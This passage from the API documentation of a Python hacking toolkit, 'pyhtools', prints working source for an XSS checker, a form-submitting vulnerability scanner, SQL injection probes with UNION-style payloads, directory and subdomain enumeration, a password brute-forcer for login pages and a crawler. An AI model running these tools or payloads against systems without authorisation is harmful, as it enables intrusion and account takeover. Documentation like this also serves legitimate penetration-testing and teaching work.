webpage\n        payload (str): XSS payload to be injected in URL during test\n    Returns: \n        bool: returns True if vulnerable else False\n    '''\nif payload is None:\npayload = \"&lt;scRipt&gt;alert('vulnerable')&lt;/sCript&gt;\"\nurl = url.replace('=',f'={payload}')\nresponse_content = self.get_page_content(url)\n# response = BeautifulSoup(response_content, 'html.parser')\n# print(BRIGHT_YELLOW + '[-] RESPONSE: \\n', response.prettify())\nreturn payload in response_content\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.vuln_scanner.scanner.Scanner.remove_escape_seq","title":"<code>remove_escape_seq(content)</code>","text":"<p>removes \\r \\t \\n from the html parsed content if present.</p> <p>Parameters:</p> Name Type Description Default <code>content</code> <code>str</code> <p>html page content as string</p> required <p>Returns:</p> Name Type Description <code>str</code> <code>str</code> <p>escaped html content without \\r \\t \\n chars</p> Source code in <code>pyhtools\\attackers\\web\\vuln_scanner\\scanner.py</code> <pre><code>def remove_escape_seq(self, content:str)-&gt;str:\nr'''removes \\r \\t \\n from the html parsed content if present.\n    Args: \n        content (str): html page content as string\n    Returns: \n        str: escaped html content without \\r \\t \\n chars\n    '''\nreturn content.replace(r'\\n','').replace(r'\\t','').replace(r'\\r','').replace(r\"\\'\",\"'\")\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.vuln_scanner.scanner.Scanner.run","title":"<code>run()</code>","text":"<p>Starts the scanner</p> <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\web\\vuln_scanner\\scanner.py</code> <pre><code>def run(self):\n'''Starts the scanner\n    Args:\n        None\n    Returns: \n        None\n    '''\ntry:\ntry:\nprint(BRIGHT_WHITE + '[*] Spider is mapping website.')\nprint(BRIGHT_YELLOW + '[!] Press ctrl+c to stop mapping!')\nself.get_target_links(self.target_url)\nexcept KeyboardInterrupt:\nprint(BRIGHT_YELLOW + '\\r[!] ctrl+c detected! Stopping Spider. Website mapping stopped.')\nprint(BRIGHT_WHITE + '[*] Finding vulnerabilites on the mapped webpages.')\nforms = self.get_forms(self.target_url)\nfor link in self.target_links:\nforms = self.get_forms(link)\nfor form in forms:\nprint(BRIGHT_WHITE + '[*] Scanning/Testing vuln in form of link: ', link)\nif self.is_xss_vulnerable_in_form(form,link):\nprint(BRIGHT_YELLOW + f'[!] Found XSS vuln in {link} form : ')\nprint(form)\nprint()\nif \"=\" in link:\nprint(BRIGHT_WHITE + '[*] Scanning/Testing vuln from URL of link: ', link)\nif self.is_xss_vulnerable_in_link(link):\nprint(BRIGHT_YELLOW + '[!] Found XSS vuln in URL :', link)\nprint()\nexcept Exception as e:\nprint(BRIGHT_RED + f'[-] Exception : {e}')\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.vuln_scanner.scanner.Scanner.submit_form","title":"<code>submit_form(form, value, url)</code>","text":"<p>submits form with passed value to url passed</p> <p>Parameters:</p> Name Type Description Default <code>form</code> <code>dict</code> <p>webpage form from bs4.element.ResultSet</p> required <code>value</code> <code>str</code> <p>Form input value to be used while filling form</p> required <code>url</code> <code>str</code> <p>base url of webpage</p> required <p>Returns:</p> Name Type Description <code>str</code> <p>html contents of the reponse</p> Source code in <code>pyhtools\\attackers\\web\\vuln_scanner\\scanner.py</code> <pre><code>def submit_form(self, form, value, url):\n'''submits form with passed value to url passed\n    Args: \n        form (dict): webpage form from bs4.element.ResultSet\n        value (str): Form input value to be used while filling form\n        url (str): base url of webpage\n    Returns: \n        str: html contents of the reponse\n    '''\naction = form.get('action')\npost_url = urljoin(url, action)\n# print(post_url)\nmethod = form.get('method')\npost_data_dict = {}\ninputs = form.find_all('input')\nfor input in inputs:\ninp_name = input.get('name') \ninp_type = input.get('type')\ninp_value = input.get('value')\nif inp_type == 'text':\ninp_value = value\npost_data_dict[inp_name]=inp_value\nif method == 'post':\npost_response = self.session.post(url=post_url, data=post_data_dict)\nelse:\npost_response = self.session.get(url=url, params=post_data_dict)\nreturn self.remove_escape_seq(str(post_response.content))\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.vuln_scanner.sqli.enumerate_tests","title":"<code>enumerate_tests(url)</code>","text":"<p>tests application for various SQL injection methods</p> <p>Parameters:</p> Name Type Description Default <code>url</code> <code>str</code> <p>url of the target</p> required <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\web\\vuln_scanner\\sqli.py</code> <pre><code>def enumerate_tests(url):\n'''tests application for various SQL injection methods\n    Args: \n        url (str): url of the target\n    Returns: \n        None\n    '''\nvuln_links = 0\nsqli_payloads = [\"'\", \"'--\",\n\"' UNION SELECT NULL--\", \"' UNION ORDER BY 1--\"]\nfor payload in sqli_payloads:\npayload_url = url + payload\nif is_vulnerable(payload_url):\nprint(f'[URL] \"{payload_url}\"')\nprint(f'[PAYLOAD] {payload}')\nprint('-'*40)\nvuln_links += 1\nprint(f'[VULN] {vuln_links} total vulnerable links found')\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.vuln_scanner.sqli.is_url_valid","title":"<code>is_url_valid(url)</code>","text":"<p>checks if url is valid</p> <p>Parameters:</p> Name Type Description Default <code>url</code> <code>str</code> <p>url of the target</p> required <p>Returns:</p> Name Type Description <code>bool</code> <code>bool</code> <p>returns True if url is valid else False</p> Source code in <code>pyhtools\\attackers\\web\\vuln_scanner\\sqli.py</code> <pre><code>def is_url_valid(url: str) -&gt; bool:\n'''checks if url is valid\n    Args: \n        url (str): url of the target\n    Returns:\n        bool: returns True if url is valid else False\n    '''\nis_valid = False\nif 'http://' in url or 'https://' in url:\nis_valid = True\nif len(url.split('?')[-1]) == 0:\nis_valid = False\nreturn is_valid\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.vuln_scanner.sqli.is_vulnerable","title":"<code>is_vulnerable(url)</code>","text":"<p>tests whether app is vulnerable to the url</p> <p>Parameters:</p> Name Type Description Default <code>url</code> <code>str</code> <p>url of the target</p> required <p>Returns:</p> Name Type Description <code>bool</code> <code>bool</code> <p>returns True if vulnerable else returns False</p> Source code in <code>pyhtools\\attackers\\web\\vuln_scanner\\sqli.py</code> <pre><code>def is_vulnerable(url: str) -&gt; bool:\n'''tests whether app is vulnerable to the url\n    Args: \n        url (str): url of the target\n    Returns: \n        bool: returns True if vulnerable else returns False\n    '''\nresponse = get(url=url)\ncontent = response.content.lower()\nif response.status_code not in (200, 404) or b'error' in content or b'on line' in content or b'at line' in content:\nreturn True\nreturn False\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.vuln_scanner.__main__.get_args","title":"<code>get_args()</code>","text":"<p>get arguments from the user and return as dict containing target_url, ignore_links, login_link, and login_details</p> <p>Returns:</p> Name Type Description <code>dict</code> <p>user arguments</p> Source code in <code>pyhtools\\attackers\\web\\vuln_scanner\\__main__.py</code> <pre><code>def get_args():\n'''get arguments from the user and return as dict containing\n    target_url, ignore_links, login_link, and login_details\n    Args:\n        None\n    Returns:\n        dict: user arguments\n    '''\nparser = argparse.ArgumentParser(description='Web Application Vulnerability Scanner')\nparser.add_argument('-t', '--target-url',dest='target_url',help='root url of the target website', required=True)\nparser.add_argument('-ig', '--ignore-links', dest='ignore_links', help='url of wepages which are to be ignored while scanning/testing for vulnerabilities separated by commas')\nparser.add_argument('-l','--login-link',dest='login_link',help='direct login/authentication link')\nparser.add_argument('-ld', '--login-details', dest='login_details', help='pass login details if authentication required as username,password (separated by comma)')\nargs = parser.parse_args()\nif args.target_url:\ntarget_url = args.target_url\nlogin_link = None\nif args.login_link:\nlogin_link = args.login_link\nlogin_details = None\nif args.login_details is not None:\nlogin_details = [detail.strip() for detail in args.login_details.split(',')]\nignore_links = None\nif args.ignore_links is not None:\nignore_links = [link.strip() for link in args.ignore_links.split(',')]\nreturn {\n\"target_url\": target_url,\n\"ignore_links\": ignore_links,\n\"login_link\": login_link,\n\"login_details\" : login_details,\n}\n</code></pre>"},{"location":"code-docs/web-attackers/#enumerate","title":"Enumerate","text":""},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.enumerate.Discoverer","title":"<code>Discoverer</code>","text":"<p>Discoverer can be used to enumerate directories and subdomains of target website.</p> Source code in <code>pyhtools\\attackers\\web\\enumerate.py</code> <pre><code>class Discoverer:\n'''\n    Discoverer can be used to enumerate directories and subdomains of target website.\n    '''\ndef __init__(self, *args, **kwargs) -&gt; None:\nself._requester = AsyncRLRequests(*args, **kwargs)\nasync def _filter_request(self, url: str, status_codes: list[int] = [200, 403, 500]):\n'''prints url if reponse status code matches code from status_codes.\n        Args:\n            url (str): URL of website   \n            status_codes (list): list of integer containing HTTP response  \n            status codes, which detects that directory/subdomain exists\n        Returns:\n            None\n        '''\nresponse = await self._requester.request(url=url)\nif isinstance(response, dict) and response.get('status') in status_codes:\nprint(url, response.get('status'))\nasync def check_dirs(self, domain: str, wordlist_path: str, status_codes: list[int] = [200, 403, 500]):\n'''enumerate website directories\n        Args:\n            domain (str): domain of the target\n            wordlist_path (str): path of wordlist file\n            status_codes (list): list of integer containing HTTP response  \n            status codes, which detects that directory exists\n        Returns:\n            None\n        '''\nif not domain.endswith('/'):\ndomain += '/'\nif not domain.startswith('https://') or domain.startswith('http://'):\ndomain = f'http://{domain}'\ndirs = read_file_lines(wordlist_path)\ntasks = []\nfor dir in dirs:\nlink = urljoin(domain, dir)\ntasks.append(\nensure_future(\nself._filter_request(link, status_codes)\n)\n)\nawait gather(*tasks)\nasync def check_subdomains(self, domain: str, wordlist_path: str, status_codes: list[int] = [200, 403, 500]):\n'''enumerate website subdomains\n        Args:\n            domain (str): domain of the target\n            wordlist_path (str): path of wordlist file\n            status_codes (list): list of integer containing HTTP response  \n            status codes, which detects that directory exists\n        Returns:\n            None\n        '''\ndomain = domain.replace('https://', '').replace('http://', '')\nsubdomains = read_file_lines(wordlist_path)\ntasks = []\nfor subdomain in subdomains:\nurl = f'http://{subdomain}.{domain}'\ntasks.append(\nensure_future(\nself._filter_request(url, status_codes)\n)\n)\nawait gather(*tasks)\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.enumerate.Discoverer.check_dirs","title":"<code>check_dirs(domain, wordlist_path, status_codes=[200, 403, 500])</code>  <code>async</code>","text":"<p>enumerate website directories</p> <p>Parameters:</p> Name Type Description Default <code>domain</code> <code>str</code> <p>domain of the target</p> required <code>wordlist_path</code> <code>str</code> <p>path of wordlist file</p> required <code>status_codes</code> <code>list</code> <p>list of integer containing HTTP response  </p> <code>[200, 403, 500]</code> <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\web\\enumerate.py</code> <pre><code>async def check_dirs(self, domain: str, wordlist_path: str, status_codes: list[int] = [200, 403, 500]):\n'''enumerate website directories\n    Args:\n        domain (str): domain of the target\n        wordlist_path (str): path of wordlist file\n        status_codes (list): list of integer containing HTTP response  \n        status codes, which detects that directory exists\n    Returns:\n        None\n    '''\nif not domain.endswith('/'):\ndomain += '/'\nif not domain.startswith('https://') or domain.startswith('http://'):\ndomain = f'http://{domain}'\ndirs = read_file_lines(wordlist_path)\ntasks = []\nfor dir in dirs:\nlink = urljoin(domain, dir)\ntasks.append(\nensure_future(\nself._filter_request(link, status_codes)\n)\n)\nawait gather(*tasks)\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.enumerate.Discoverer.check_subdomains","title":"<code>check_subdomains(domain, wordlist_path, status_codes=[200, 403, 500])</code>  <code>async</code>","text":"<p>enumerate website subdomains</p> <p>Parameters:</p> Name Type Description Default <code>domain</code> <code>str</code> <p>domain of the target</p> required <code>wordlist_path</code> <code>str</code> <p>path of wordlist file</p> required <code>status_codes</code> <code>list</code> <p>list of integer containing HTTP response  </p> <code>[200, 403, 500]</code> <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\web\\enumerate.py</code> <pre><code>async def check_subdomains(self, domain: str, wordlist_path: str, status_codes: list[int] = [200, 403, 500]):\n'''enumerate website subdomains\n    Args:\n        domain (str): domain of the target\n        wordlist_path (str): path of wordlist file\n        status_codes (list): list of integer containing HTTP response  \n        status codes, which detects that directory exists\n    Returns:\n        None\n    '''\ndomain = domain.replace('https://', '').replace('http://', '')\nsubdomains = read_file_lines(wordlist_path)\ntasks = []\nfor subdomain in subdomains:\nurl = f'http://{subdomain}.{domain}'\ntasks.append(\nensure_future(\nself._filter_request(url, status_codes)\n)\n)\nawait gather(*tasks)\n</code></pre>"},{"location":"code-docs/web-attackers/#get-forms","title":"Get Forms","text":""},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.get_forms.fuzz_forms","title":"<code>fuzz_forms(target_url)</code>","text":"<p>get forms from html page, send post request and return html response </p> <p>Parameters:</p> Name Type Description Default <code>target_url</code> <code>str</code> <p>webpage URL containing forms</p> required <p>Returns:</p> Name Type Description <code>str</code> <p>returns html content of page after sending fuzzed form request</p> Source code in <code>pyhtools\\attackers\\web\\get_forms.py</code> <pre><code>def fuzz_forms(target_url:str):\n'''get forms from html page, send post request and return html response \n    Args: \n        target_url (str): webpage URL containing forms\n    Returns: \n        str: returns html content of page after sending fuzzed form request\n    '''\npage_content = get_page_content(target_url)\n# remove\\r \\t \\n from the page content\npage_content = remove_escape_seq(page_content)\npage_html = BeautifulSoup(page_content,'html.parser')\nforms = page_html.find_all(name='form')\nfor form in forms:\naction = form.get('action')\npost_url = urljoin(target_url, action)\n# print(post_url)\n# method = form.get('method')\npost_data_dict = {}\ninputs = form.find_all('input')\nfor input in inputs:\ninp_name = input.get('name') \ninp_type = input.get('type')\ninp_value = input.get('value')\nif inp_type == 'text':\ninp_value = 'pyhtools-form-test'\nelif inp_type == 'password':\ninp_value = 'pyhtools-P#$$Wd!!!'\npost_data_dict[inp_name]=inp_value\npost_response = requests.post(url=post_url, data=post_data_dict)\npost_response_content = remove_escape_seq(str(post_response.content))\npost_content = BeautifulSoup(post_response_content, 'html.parser')\nreturn str(post_content.prettify())\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.get_forms.get_page_content","title":"<code>get_page_content(url)</code>","text":"<p>extracts html code of the webpage </p> <p>Parameters:</p> Name Type Description Default <code>url</code> <code>str</code> <p>webpage URL</p> required <p>Returns:</p> Name Type Description <code>str</code> <p>HTML content of the webpage</p> Source code in <code>pyhtools\\attackers\\web\\get_forms.py</code> <pre><code>def get_page_content(url:str):\n'''extracts html code of the webpage \n    Args: \n        url (str): webpage URL\n    Returns: \n        str: HTML content of the webpage\n    '''\nresponse = requests.get(url)\ncontent = str(response.content)\ncontent = remove_escape_seq(content)\nreturn content\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.get_forms.remove_escape_seq","title":"<code>remove_escape_seq(content)</code>","text":"<p>removes </p> <p>from the html parsed content if present.</p> <p>Args:         content (str): html content of webpage</p> <p>Returns:         str: returns escaped html code</p> Source code in <code>pyhtools\\attackers\\web\\get_forms.py</code> <pre><code>def remove_escape_seq(content:str)-&gt;str:\n'''removes \\r \\t \\n from the html parsed content if present.\n    Args: \n        content (str): html content of webpage\n    Returns: \n        str: returns escaped html code\n    '''\nreturn content.replace(r'\\n','').replace(r'\\t','').replace(r'\\r','')\n</code></pre>"},{"location":"code-docs/web-attackers/#login-guesser","title":"Login Guesser","text":""},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.login_guesser.bruteforce_login","title":"<code>bruteforce_login(target_url, wordlist_file, post_values)</code>","text":"<p>Bruteforces login requests on a website</p> <p>Parameters:</p> Name Type Description Default <code>target_url</code> <code>str</code> <p>URL of login page</p> required <code>wordlist_file</code> <code>str</code> <p>path of wordlist file</p> required <code>post_values</code> <code>dict</code> <p>dict containing key value pairs of POST data</p> required <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\web\\login_guesser.py</code> <pre><code>def bruteforce_login(target_url:str, wordlist_file:str, post_values:dict):\n'''Bruteforces login requests on a website\n    Args:\n        target_url (str): URL of login page\n        wordlist_file (str): path of wordlist file\n        post_values (dict): dict containing key value pairs of POST data\n    Returns:\n        None\n    '''\n# tested on DVWA web app.\n# target_url = \"http://10.0.2.30/dvwa/login.php\"\n# wordlist_file = \"full_path_to_wordlist\"\n# post_values = {\"username\":\"admin\", \"password\":\"\", \"Login\":\"submit\"}\nif os.path.isfile(wordlist_file):\nprint(BRIGHT_WHITE + '[*] Wordlist File Found! Starting Bruteforce Attack!!')\nwith open(wordlist_file,'r') as wordlist:\nfor word in wordlist:\npassword = word.strip()\npost_values['password'] = password\npost_response = requests.post(target_url, data=post_values)\ncontent = str(post_response.content)\nif \"Login failed\" not in content:\nprint(BRIGHT_YELLOW + '[*] Password Found! : ' + password)\nsys.exit()\nprint(BRIGHT_RED + '[!] Password Not Found!')\nelse:\nprint(BRIGHT_RED + '[-] Wordlist Not Found.')\n</code></pre>"},{"location":"code-docs/web-attackers/#spider","title":"Spider","text":""},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.spider.Spider","title":"<code>Spider</code>","text":"<p>class Spider used to extract links from website's webpage</p> Source code in <code>pyhtools\\attackers\\web\\spider.py</code> <pre><code>class Spider:\n'''\n    class Spider used to extract links from website's webpage\n    '''\ndef __init__(self, rate_limit:int=100, delay:int=0.0001, headers:dict=None) -&gt; None:\n'''\n        Spider constructor\n        Args:\n            rate_limit (int): number of concurrent requests at the same time \n            delay (float): delay between consecutive requests \n            headers (dict): overrides default headers while sending HTTP requests \n        Returns:\n            None\n        '''\n# list to save links on the whole webpage\n# to avoid repetition\nself.target_links = set()\nself._client = AsyncRLRequests(rate_limit=rate_limit, delay=delay, headers=headers)\nasync def get_links(self, url: str) -&gt; set:\n'''extracts links from the whole webpage\n        Args: \n            url (str): URL of the webpage\n        Returns: \n            list: list of links present in the webpage\n        '''\nresponse = await self._client.request(url=url)\nhtml = response.get('res_body')\nif html is None:\nreturn set()\nsoup = BeautifulSoup(html, 'html.parser')\nhref_links = set()\nfor link in soup.find_all(href=True):\nhref_link = link.get('href')\nif href_link:\nhref_links.add(href_link)\nreturn href_links\nasync def get_target_links(self, url: str, print_link: bool = True):\n'''extracts useful links and prints them which are\n        only related to the target webpage\n        Args: \n            links (list): list of all links from the target webpage\n        Returns:\n            list: returns useful links list related to target webpage\n        '''\n# extract links from page\nlinks:set = await self.get_links(url)\nnew_links = set()\nfor link in links:\nlink = urljoin(url, link)\nif '#' in link:\nlink = link.split('#')[0]\nif link not in self.target_links and url in link:\nlink = unescape(link)\nnew_links.add(link)\nif print_link:\nprint(link)\nreturn new_links\nasync def start(self, target_url:str, print_links: bool = True):\n'''starts spider\n        Args:\n            target_url (str): URL of the target website\n            print_links (bool): if True prints links found on console\n        Returns:\n            list: list of links found by spider\n        '''\nqueue = [target_url]\nwhile queue:\n# extract a link from queue\ncurrent_url = queue.pop(0)\n# continue if url is already visited\nif current_url in self.target_links:\ncontinue\n# add url to visited set\nself.target_links.add(current_url)\n# skip scraping static files since it'll slow down process\nif current_url.endswith(('.css', '.js','.jpeg', '.png','.svg')):\ncontinue\n# get links from \nlinks = await self.get_target_links(current_url, print_link=print_links)\n# add new links to queue\nqueue.extend(links - self.target_links)\nreturn self.target_links\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.spider.Spider.__init__","title":"<code>__init__(rate_limit=100, delay=0.0001, headers=None)</code>","text":"<p>Spider constructor</p> <p>Parameters:</p> Name Type Description Default <code>rate_limit</code> <code>int</code> <p>number of concurrent requests at the same time </p> <code>100</code> <code>delay</code> <code>float</code> <p>delay between consecutive requests </p> <code>0.0001</code> <code>headers</code> <code>dict</code> <p>overrides default headers while sending HTTP requests </p> <code>None</code> <p>Returns:</p> Type Description <code>None</code> <p>None</p> Source code in <code>pyhtools\\attackers\\web\\spider.py</code> <pre><code>def __init__(self, rate_limit:int=100, delay:int=0.0001, headers:dict=None) -&gt; None:\n'''\n    Spider constructor\n    Args:\n        rate_limit (int): number of concurrent requests at the same time \n        delay (float): delay between consecutive requests \n        headers (dict): overrides default headers while sending HTTP requests \n    Returns:\n        None\n    '''\n# list to save links on the whole webpage\n# to avoid repetition\nself.target_links = set()\nself._client = AsyncRLRequests(rate_limit=rate_limit, delay=delay, headers=headers)\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.spider.Spider.get_links","title":"<code>get_links(url)</code>  <code>async</code>","text":"<p>extracts links from the whole webpage</p> <p>Parameters:</p> Name Type Description Default <code>url</code> <code>str</code> <p>URL of the webpage</p> required <p>Returns:</p> Name Type Description <code>list</code> <code>set</code> <p>list of links present in the webpage</p> Source code in <code>pyhtools\\attackers\\web\\spider.py</code> <pre><code>async def get_links(self, url: str) -&gt; set:\n'''extracts links from the whole webpage\n    Args: \n        url (str): URL of the webpage\n    Returns: \n        list: list of links present in the webpage\n    '''\nresponse = await self._client.request(url=url)\nhtml = response.get('res_body')\nif html is None:\nreturn set()\nsoup = BeautifulSoup(html, 'html.parser')\nhref_links = set()\nfor link in soup.find_all(href=True):\nhref_link = link.get('href')\nif href_link:\nhref_links.add(href_link)\nreturn href_links\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.spider.Spider.get_target_links","title":"<code>get_target_links(url, print_link=True)</code>  <code>async</code>","text":"<p>extracts useful links and prints them which are only related to the target webpage</p> <p>Parameters:</p> Name Type Description Default <code>links</code> <code>list</code> <p>list of all links from the target webpage</p> required <p>Returns:</p> Name Type Description <code>list</code> <p>returns useful links list related to target webpage</p> Source code in <code>pyhtools\\attackers\\web\\spider.py</code> <pre><code>async def get_target_links(self, url: str, print_link: bool = True):\n'''extracts useful links and prints them which are\n    only related to the target webpage\n    Args: \n        links (list): list of all links from the target webpage\n    Returns:\n        list: returns useful links list related to target webpage\n    '''\n# extract links from page\nlinks:set = await self.get_links(url)\nnew_links = set()\nfor link in links:\nlink = urljoin(url, link)\nif '#' in link:\nlink = link.split('#')[0]\nif link not in self.target_links and url in link:\nlink = unescape(link)\nnew_links.add(link)\nif print_link:\nprint(link)\nreturn new_links\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.spider.Spider.start","title":"<code>start(target_url, print_links=True)</code>  <code>async</code>","text":"<p>starts spider</p> <p>Parameters:</p> Name Type Description Default <code>target_url</code> <code>str</code> <p>URL of the target website</p> required <code>print_links</code> <code>bool</code> <p>if True prints links found on console</p> <code>True</code> <p>Returns:</p> Name Type Description <code>list</code> <p>list of links found by spider</p> Source code in <code>pyhtools\\attackers\\web\\spider.py</code> <pre><code>async def start(self, target_url:str, print_links: bool = True):\n'''starts spider\n    Args:\n        target_url (str): URL of the target website\n        print_links (bool): if True prints links found on console\n    Returns:\n        list: list of links found by spider\n    '''\nqueue = [target_url]\nwhile queue:\n# extract a link from queue\ncurrent_url = queue.pop(0)\n# continue if url is already visited\nif current_url in self.target_links:\ncontinue\n# add url to visited set\nself.target_links.add(current_url)\n# skip scraping static files since it'll slow down process\nif current_url.endswith(('.css', '.js','.jpeg', '.png','.svg')):\ncontinue\n# get links from \nlinks = await self.get_target_links(current_url, print_link=print_links)\n# add new links to queue\nqueue.extend(links - self.target_links)\nreturn self.target_links\n</code></pre>"},{"location":"code-docs/web-attackers/#utils","title":"Utils","text":""},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.utils.AsyncRLRequests","title":"<code>AsyncRLRequests</code>","text":"<p>         Bases: <code>AsyncRequests</code></p> <p>Send Asynchronous rate limited HTTP requests.</p> Source code in <code>pyhtools\\attackers\\web\\utils.py</code> <pre><code>class AsyncRLRequests(AsyncRequests):\n'''\n    Send Asynchronous rate limited HTTP requests.\n    '''\ndef __init__(self, rate_limit: int = 20, delay: float = 0.05, headers: dict = None) -&gt; None:\n'''AsyncRLRequests constructor\n        Args:\n            rate_limit (int): number of concurrent requests at the same time\n            delay (float): delay between consecutive requests\n            headers (dict): overrides default headers while sending HTTP requests\n        Returns:\n            None\n        '''\nassert isinstance(delay, float) or isinstance(delay, int)\nassert isinstance(rate_limit, float) or isinstance(rate_limit, int)\nself._delay = delay\nself._semaphore = asyncio.Semaphore(rate_limit)\nsuper().__init__(headers)\nasync def request(self, url: str, method: str = 'GET', session: ClientSession = None, *args, **kwargs) -&gt; ClientResponse:\n'''Send HTTP requests asynchronously with rate limit and delay between the requests\n        Args:\n            url (str): URL of the webpage/endpoint\n            method (str): HTTP methods (default: GET) supports GET, POST, \n            PUT, HEAD, OPTIONS, DELETE\n            session (aiohttp.ClientSession): aiohttp Client Session for sending requests\n        Returns:\n            dict: returns request and response data as dict\n        '''\nasync with self._semaphore:\nresponse = await super().request(url, method, session, *args, **kwargs)\nawait asyncio.sleep(self._delay)\nreturn response\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.utils.AsyncRLRequests.__init__","title":"<code>__init__(rate_limit=20, delay=0.05, headers=None)</code>","text":"<p>AsyncRLRequests constructor</p> <p>Parameters:</p> Name Type Description Default <code>rate_limit</code> <code>int</code> <p>number of concurrent requests at the same time</p> <code>20</code> <code>delay</code> <code>float</code> <p>delay between consecutive requests</p> <code>0.05</code> <code>headers</code> <code>dict</code> <p>overrides default headers while sending HTTP requests</p> <code>None</code> <p>Returns:</p> Type Description <code>None</code> <p>None</p> Source code in <code>pyhtools\\attackers\\web\\utils.py</code> <pre><code>def __init__(self, rate_limit: int = 20, delay: float = 0.05, headers: dict = None) -&gt; None:\n'''AsyncRLRequests constructor\n    Args:\n        rate_limit (int): number of concurrent requests at the same time\n        delay (float): delay between consecutive requests\n        headers (dict): overrides default headers while sending HTTP requests\n    Returns:\n        None\n    '''\nassert isinstance(delay, float) or isinstance(delay, int)\nassert isinstance(rate_limit, float) or isinstance(rate_limit, int)\nself._delay = delay\nself._semaphore = asyncio.Semaphore(rate_limit)\nsuper().__init__(headers)\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.utils.AsyncRLRequests.request","title":"<code>request(url, method='GET', session=None, *args, **kwargs)</code>  <code>async</code>","text":"<p>Send HTTP requests asynchronously with rate limit and delay between the requests</p> <p>Parameters:</p> Name Type Description Default <code>url</code> <code>str</code> <p>URL of the webpage/endpoint</p> required <code>method</code> <code>str</code> <p>HTTP methods (default: GET) supports GET, POST, </p> <code>'GET'</code> <code>session</code> <code>aiohttp.ClientSession</code> <p>aiohttp Client Session for sending requests</p> <code>None</code> <p>Returns:</p> Name Type Description <code>dict</code> <code>ClientResponse</code> <p>returns request and response data as dict</p> Source code in <code>pyhtools\\attackers\\web\\utils.py</code> <pre><code>async def request(self, url: str, method: str = 'GET', session: ClientSession = None, *args, **kwargs) -&gt; ClientResponse:\n'''Send HTTP requests asynchronously with rate limit and delay between the requests\n    Args:\n        url (str): URL of the webpage/endpoint\n        method (str): HTTP methods (default: GET) supports GET, POST, \n        PUT, HEAD, OPTIONS, DELETE\n        session (aiohttp.ClientSession): aiohttp Client Session for sending requests\n    Returns:\n        dict: returns request and response data as dict\n    '''\nasync with self._semaphore:\nresponse = await super().request(url, method, session, *args, **kwargs)\nawait asyncio.sleep(self._delay)\nreturn response\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.utils.AsyncRequests","title":"<code>AsyncRequests</code>","text":"<p>AsyncRequests class helps to send HTTP requests.</p> Source code in <code>pyhtools\\attackers\\web\\utils.py</code> <pre><code>class AsyncRequests:\n'''\n    AsyncRequests class helps to send HTTP requests.\n    '''\ndef __init__(self, headers: dict = None) -&gt; None:\n'''AsyncRequests class constructor\n        Args:\n            headers (dict): overrides default headers while sending HTTP requests\n        Returns:\n            None\n        '''\nself._headers = headers\nasync def request(self, url: str, method: str = 'GET', session: ClientSession = None, *args, **kwargs) -&gt; ClientResponse:\n'''Send HTTP requests asynchronously\n        Args:\n            url (str): URL of the webpage/endpoint\n            method (str): HTTP methods (default: GET) supports GET, POST, \n            PUT, HEAD, OPTIONS, DELETE\n            session (aiohttp.ClientSession): aiohttp Client Session for sending requests\n        Returns:\n            dict: returns request and response data as dict\n        '''\nis_new_session = False\nif not session:\nsession = ClientSession(headers=self._headers)\nis_new_session = True\nmethod = str(method).upper()\nmatch method:\ncase 'GET':\nsent_req = session.get(url, *args, **kwargs)\ncase 'POST':\nsent_req = session.post(url, *args, **kwargs)\ncase 'PUT':\nsent_req = session.put(url, *args, **kwargs)\ncase 'PATCH':\nsent_req = session.patch(url, *args, **kwargs)\ncase 'HEAD':\nsent_req = session.head(url, *args, **kwargs)\ncase 'OPTIONS':\nsent_req = session.options(url, *args, **kwargs)\ncase 'DELETE':\nsent_req = session.delete(url, *args, **kwargs)\nresp_data = None\nasync with sent_req as response:\nresp_data = {\n\"status\": response.status,\n\"req_url\": str(response.request_info.real_url),\n\"req_method\": response.request_info.method,\n\"req_headers\": dict(**response.request_info.headers),\n\"res_redirection\": str(response.history),\n\"res_headers\": dict(response.headers),\n\"res_body\": await response.text(),\n}\nif is_new_session:\nawait session.close()\nreturn resp_data\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.utils.AsyncRequests.__init__","title":"<code>__init__(headers=None)</code>","text":"<p>AsyncRequests class constructor</p> <p>Parameters:</p> Name Type Description Default <code>headers</code> <code>dict</code> <p>overrides default headers while sending HTTP requests</p> <code>None</code> <p>Returns:</p> Type Description <code>None</code> <p>None</p> Source code in <code>pyhtools\\attackers\\web\\utils.py</code> <pre><code>def __init__(self, headers: dict = None) -&gt; None:\n'''AsyncRequests class constructor\n    Args:\n        headers (dict): overrides default headers while sending HTTP requests\n    Returns:\n        None\n    '''\nself._headers = headers\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.utils.AsyncRequests.request","title":"<code>request(url, method='GET', session=None, *args, **kwargs)</code>  